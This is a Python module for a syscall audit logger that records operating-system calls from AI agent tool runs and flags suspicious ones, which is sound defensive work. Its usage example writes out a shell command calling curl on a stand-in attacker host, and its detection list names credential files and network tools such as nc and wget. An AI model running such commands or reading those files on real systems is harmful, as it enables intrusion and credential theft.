"""
ASTRAXIS-AI Syscall Audit Logger Module.

Captures operating system call events (syscalls) generated during agent tool runs
to detect unauthorized system-level operations.

Key Concept — Syscall Auditing (e.g. Linux eBPF / auditd):
    When an AI agent tool runs commands, it triggers operating system kernel syscalls:
    - EXECVE: Spawning a new binary process (e.g. /bin/sh, /usr/bin/curl).
    - OPENAT: Opening a file path (e.g. /etc/shadow, /var/secrets.env).
    - CONNECT: Initiating a network socket connection to an IP/port.
    - READ/WRITE: File I/O operations.
"""
from __future__ import annotations

import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Dict, List, Any, Optional


class SyscallType(str, Enum):
    """Taxonomy of monitored low-level operating system calls."""
    EXECVE = "execve"
    OPENAT = "openat"
    CONNECT = "connect"
    READ = "read"
    WRITE = "write"
    SOCKET = "socket"


@dataclass
class SyscallEvent:
    """
    Represents a captured kernel syscall event.

    Attributes:
        syscall_id:  Unique UUID identifier.
        process_id:  Simulated or real OS Process ID (PID).
        syscall_name:SyscallType enum (execve, openat, etc.).
        argument:    Target path, command, or IP address passed to the syscall.
        agent_id:    Agent component responsible for initiating the tool call.
        is_suspicious: True if syscall matches known attack signatures.
        timestamp:   ISO timestamp.
    """
    syscall_id: str
    process_id: int
    syscall_name: SyscallType
    argument: str
    agent_id: str
    is_suspicious: bool = False
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Serialize syscall event to dictionary for audit logs."""
        return {
            "syscall_id": self.syscall_id,
            "process_id": self.process_id,
            "syscall_name": self.syscall_name.value if isinstance(self.syscall_name, Enum) else self.syscall_name,
            "argument": self.argument,
            "agent_id": self.agent_id,
            "is_suspicious": self.is_suspicious,
            "timestamp": self.timestamp,
        }


class SyscallAuditLogger:
    """
    Audit logger for recording and analyzing kernel syscall events.

    Usage:
        logger = SyscallAuditLogger()
        event = logger.log_syscall(
            pid=1042,
            syscall=SyscallType.EXECVE,
            arg="/bin/bash -c 'curl evil.com'",
            agent="CodeRunnerAgent"
        )
        print(event.is_suspicious)
    """

    def __init__(self) -> None:
        self._events: List[SyscallEvent] = []
        self._suspicious_patterns = [
            "/etc/shadow", "/etc/passwd", "curl", "wget", "nc", "ncat",
            "chmod +x", "chown", "shadow", "authorized_keys"
        ]

    @property
    def events(self) -> List[SyscallEvent]:
        """Return all logged syscall events."""
        return self._events

    def log_syscall(
        self,
        pid: int,
        syscall: SyscallType,
        arg: str,
        agent: str
    ) -> SyscallEvent:
        """
        Record a new syscall event and evaluate its threat score.

        Args:
            pid: Process ID.
            syscall: SyscallType enum.
            arg: File path, shell command, or IP address.
            agent: Name of originating agent.

        Returns:
            SyscallEvent object.
        """
        arg_lower = arg.lower()
        is_suspicious = any(pattern in arg_lower for pattern in self._suspicious_patterns)

        event = SyscallEvent(
            syscall_id=str(uuid.uuid4()),
            process_id=pid,
            syscall_name=syscall,
            argument=arg,
            agent_id=agent,
            is_suspicious=is_suspicious,
        )

        self._events.append(event)
        return event

    def get_suspicious_events(self) -> List[SyscallEvent]:
        """Return all syscall events marked as suspicious."""
        return [e for e in self._events if e.is_suspicious]

    def clear(self) -> None:
        """Clear recorded syscall log cache."""
        self._events.clear()
